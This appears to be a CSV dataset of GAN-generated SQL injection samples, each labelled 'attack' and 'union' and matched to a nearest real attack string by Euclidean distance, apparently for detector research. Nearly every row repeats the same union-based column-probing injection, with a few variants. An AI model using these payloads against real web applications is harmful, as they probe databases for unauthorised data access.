id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000062,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.449205796171595
GAN_000063,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4534002996599447
GAN_000064,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7364225196602407
GAN_000065,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.796638894903891
GAN_000066,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.613613069241077
GAN_000067,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.529522538581192
GAN_000068,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5923243083602525
GAN_000069,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.819620681445384
GAN_000070,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6652588312013687
GAN_000071,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000294,3.9110262951800507
GAN_000072,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6234850701207075
GAN_000073,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.50421386747437
GAN_000074,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5925236202788446
GAN_000075,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6050416776338707
GAN_000076,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.9173944194171293
GAN_000077,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6821275818191146
GAN_000078,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.867997278536874
GAN_000079,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6565262370110383
GAN_000080,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4612533368502842
GAN_000081,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000203,4.245499063327362
GAN_000082,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.685726726691956
GAN_000083,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.557866386184717
GAN_000084,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7468337987204405
GAN_000085,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5822826336756104
GAN_000086,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,4.070952971275195
GAN_000087,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.689608806560026
GAN_000088,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.955191750812808
GAN_000089,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6882092108900704
GAN_000090,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.402510737016143
GAN_000091,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4995311575501153
GAN_000092,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.798348058532345
GAN_000093,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7737514104755077
GAN_000094,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5510316932464914
GAN_000095,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.53968804198433
GAN_000096,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.680271059200282
GAN_000097,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.405358998669148
GAN_000098,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5443107958555458
GAN_000099,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7252675508900186
GAN_000100,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6750986278206272
GAN_000101,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8407747610551697
GAN_000102,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,4.125866645991972
GAN_000103,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.078122350856938
GAN_000104,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7865947920326493
GAN_000105,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4655456808310494
GAN_000106,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6662409791881396
GAN_000107,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.678577475151973
GAN_000108,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6132468613534563
GAN_000109,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.3914082277871453
GAN_000110,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7698239510305145
GAN_000111,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.953804601415419
GAN_000112,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000203,3.91867055776803
GAN_000113,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7185012840227136
GAN_000114,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.418615958496789
GAN_000115,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.871946404122963
GAN_000116,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6420055341309028
GAN_000117,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.795158606345392
GAN_000118,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5261423554777185
GAN_000119,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000294,3.9351241133051134
GAN_000120,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.664581415031512
GAN_000121,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.684981686251342
GAN_000122,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7302758082117164
GAN_000123,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,4.170661619341062
GAN_000124,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5764749338960073
GAN_000125,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5650155386236655
GAN_000126,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6599038880486026
GAN_000127,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7784457055441543
GAN_000128,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7866401696774767
GAN_000129,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000294,3.9619452208797687
GAN_000130,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.677750440503066
GAN_000131,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5273932637448095
GAN_000132,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.041835142733472
GAN_000133,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.673167816834755
GAN_000134,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5934072050298034
GAN_000135,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,4.156149627205937
GAN_000136,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.652466560119338
GAN_000137,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.881055331512643
GAN_000138,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7638773628617397
GAN_000139,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4877135973629083
GAN_000140,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.458803475531019
GAN_000141,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5995496361715924
GAN_000142,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.030966516208685
GAN_000143,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.40839445610401
GAN_000144,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.077906931704077
GAN_000145,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,3.8226232282243306
GAN_000146,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.741919802153894
GAN_000147,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5001020603023867
GAN_000148,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.655332002110412
GAN_000149,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.517223842300942
GAN_000150,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.012569021454627
GAN_000151,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8698106555774037
GAN_000152,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.999039850972599
GAN_000153,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5834157776845577
GAN_000154,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.958351977833728
GAN_000155,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.9849665687975815
GAN_000156,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,4.095587613152241
GAN_000157,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8546009219595394
GAN_000158,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.598350819487651
GAN_000159,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.934646422883374
GAN_000160,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.039974821098087
GAN_000161,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8732748494406084
GAN_000162,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4243829980327507
GAN_000163,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6874671615165946
GAN_000164,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.611768412158265
GAN_000165,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.552188484826948
GAN_000166,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000294,4.016474318943973
GAN_000167,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.626554252979069
GAN_000168,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8108896714270086
GAN_000169,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.049210492201174
GAN_000170,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8906537035994804
GAN_000171,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.519017532605575
GAN_000172,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.3960029586808833
GAN_000173,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7879881563205338
GAN_000174,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6297056601355866
GAN_000175,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,4.135232637293609
GAN_000176,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000203,4.019181055578173
GAN_000177,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.45951352057082
GAN_000178,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.540078403468894
GAN_000179,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.8767235477121953
GAN_000180,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.080354843839725
GAN_000181,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,3.9205945248773997
GAN_000182,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.9404637623980063
GAN_000183,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.531685724420648
GAN_000184,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.658331489301898
GAN_000185,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.823141630876694
GAN_000186,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000203,4.055875644168466
GAN_000187,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.646091103182462
GAN_000188,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,4.050600929384638
GAN_000189,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.4280481093417503
GAN_000190,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.631037383918333
GAN_000191,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.39655086246061
GAN_000192,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7591120216706253
GAN_000193,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.476901972592972
GAN_000194,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.3965964450839325
GAN_000195,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.819962832524944
GAN_000196,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.7546477561402396
GAN_000197,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000203,4.017506662687879
GAN_000198,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.701524749918534
GAN_000199,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.6973585157969717
GAN_000200,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000205,3.5153508460282037
